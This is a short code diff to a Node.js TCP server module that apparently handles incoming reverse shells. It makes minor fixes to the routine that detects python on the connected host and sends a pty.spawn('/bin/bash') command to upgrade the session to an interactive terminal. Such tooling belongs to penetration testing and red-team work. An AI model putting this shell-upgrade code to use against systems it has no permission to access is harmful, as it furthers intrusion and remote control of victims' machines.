@@ -19,7 +19,7 @@ module.exports = class TCPServer {
         // Upgrade shell
         setTimeout(() => {
           socket.once("data", (python) => {
-            let output = python.toString().trim();
+            let output = python.toString().trim().split("\n")[0];
             if (!output.includes("python")) {
               socket.write(
                 Buffer.from(
@@ -27,7 +27,7 @@ module.exports = class TCPServer {
                 )
               );
             } else {
-              socket.isTty = true
+              socket.isTty = true;
               socket.write(
                 Buffer.from(
                   `${output} -c 'import pty; pty.spawn("/bin/bash")'\n`
